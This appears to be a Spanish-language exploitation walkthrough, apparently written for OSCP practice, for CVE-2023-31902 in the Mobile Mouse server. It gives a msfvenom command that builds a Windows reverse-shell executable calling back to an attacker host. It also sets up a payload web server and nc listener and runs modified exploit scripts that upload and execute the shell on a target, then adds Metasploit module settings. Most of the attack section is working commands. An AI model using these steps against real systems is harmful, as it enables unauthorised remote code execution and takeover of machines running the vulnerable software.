## know how mobile mouse CVE-2023-31902

```bash
## know how CVE-2023-31902
## mobile mouse CVE-2023-31902
## port 9099
## Customization Jos√© Luis √ç√±igo A.K.A Riskoo
```

Puedes usar los exploits 51010lanzar1.py  51010lanzar2.py 

Tuve problemas al usar el exploit 51010.py , me fu√© imposible conseguir la reverse shell, por lo que tuve que investigar un poco.

Inicialmente entr√© usando el exploit de metasploit "cosa que sabemos que no vale en el OSCP", pero esto me sirvi√≥ para desde dentro ver que estaba pasando.

Una vez dentro comenc√© a ejecutar el exploit 51010. Recordad que lo que quiero es que funcione este exploit ya que el de metasploit funciona perfectamente, aunque hay que iniciarlo varias veces.


## Observaciones

1. El archivo se sub√≠a a veces y otras no
2. El archivo tardaba desde que aparec√≠a el nombre haciendo un dir pero con 0 bytes, hasta que estaba completo. Pero el exploit original solo esperaba 2 segundos cuando realmente tardaba bastante m√°s.
3. El archivo daba problemas a veces con el nombre command que le sub√≠as por lo que cog√≠ y le establec√≠ uno por defecto que es shell64.exe, obviamente se lo puedes cambiar.
  

## Pasos para que funcione.



üî•üî• La idea es que con el lanzar1 suba el archivo, cruzar los dedos para que suba y luego lanzar el "lanzar2" y debe de funcionar. 

1. Crea la reverse shell en .exe con msfvenom

```bash
msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell64.exe LHOST=192.168.x.x LPORT=8082
```

2. Pon un servidor python por el puerto 8080 donde est√© el archivo shell64.exe

3. Nos ponemos en escucha por el puerto 8082

```bash
rlwrap nc -lnvp 8082

```
4. Lanzamos el exploit 51010lanzar1.py

```bash

python3 51010lanzar1.py --target 192.168.x.x --file shell64.exe --lhost 192.168.x.x
```

5. lanzamos el exploit 51010lanzar2.py

```bash
python3 51010lanzar2.py --target 192.168.x.x --file shell64.exe --lhost 192.168.x.x
```


## know how mobile mouse oscp Metasploit

Puedes encontrar el exploit haciendo searchsploit mobile mouse

Al final tuve que usar metasploit https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/windows/misc/mobile_mouse_rce

Solo puse el rhost, el localhost y debug a true como aparece. 

üî•üî• He tenido que lanzar varias veces el exploit en metasploit para que me funcione porque aparece que no crea la sesi√≥n

```bash
set lhost 192.168.x.x
set rhosts 192.168.x.x
set verbose true
run
```
